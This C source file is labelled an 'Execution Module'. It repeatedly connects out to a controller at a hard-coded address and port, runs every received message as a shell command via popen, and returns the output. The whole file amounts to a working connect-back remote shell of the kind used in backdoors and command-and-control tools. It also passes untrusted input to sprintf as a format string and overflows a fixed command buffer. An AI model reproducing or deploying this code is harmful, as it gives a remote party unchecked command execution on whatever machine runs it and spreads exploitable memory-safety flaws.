/*
    Execution Module.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>       // strlen
#include <sys/socket.h>   // socket
#include <arpa/inet.h>    // inet_addr
#include <unistd.h>       // write
#include <fcntl.h>

#define COMMAND_LEN 249
#define DATA_SIZE 512
#define debug  1
int main(int argc , char *argv[])
{
    // Variables
    int sock, read_size;
    struct sockaddr_in controler;
    char message[5000];

    char *addr = "127.0.0.2";
   //char *addr = "192.168.1.68";// IP address of Control Module
    short port = 8888;
   while(true){
     while(true){
      // Create a socket. Return value is a file descriptor for the socket.
      sock = socket(AF_INET, SOCK_STREAM, 0);
      if (sock == -1) {
          perror("Error creating socket\n");
          exit(0);
      }
      printf("Executor socket created\n");

      // Set the Control ip address, connection family and port
      controler.sin_addr.s_addr = inet_addr(addr);
      controler.sin_family      = AF_INET;
      controler.sin_port        = htons(port);
   
     sleep(1); //Delay so that Executor does not drain all CPU usage

    // Connect to remote controler
    if (connect(sock, (struct sockaddr *) &controler, sizeof(controler)) < 0) {
        perror("Error establishing connection\n");
    } else break;
   }
    printf("Connecting to Controler...\n");

    // Receive a message from Controler
    while ((read_size = read(sock, message, sizeof(message))) > 0) {
        message[read_size] = '\0';
         if(debug == 1)
           printf("Executing command : %s read size = %d \n", message,read_size);
      /**********   command execution  ******/
       FILE *pf;
       char command[COMMAND_LEN];
       char data[DATA_SIZE];
       
       //copies formatted output to command variable
       sprintf(command, message); 
       message[0] = '\0';
       // Setup our pipe for reading and execute our command.
       pf = popen(command,"r");
       int status = 0;
       if(!pf){
         if(debug == 1)
           printf("Could not open pipe for output.\n");
         status =-1;
       }

       // Grab data from process execution
      while(status == 0) {
       if(fgets(data, DATA_SIZE , pf) == NULL)
         break;

       // Print grabbed data to the screen.
       if(debug == 1)
		  printf("%s",data);
       strcat(message,data);
    } // end while
      if(debug == 1)
        printf("Sending final message :  %s",message);
      if (pclose(pf) != 0){
          fprintf(stderr," Error: Failed to close command streamddff %s \n",message);
          write(sock, "error", 5);
	  continue;
       }

/**********   command execution  ******/

      if(strlen(message) ==0)
	  strcat(message,"Command Executed");
          write(sock, message, strlen(message));
      }
    
    if(read_size == 0) {
        printf("Server disconnected\n");
    } else if(read_size == -1) {
        perror("Error receiving message from server\n");
    }
}

    close(sock);
    return 0;
}
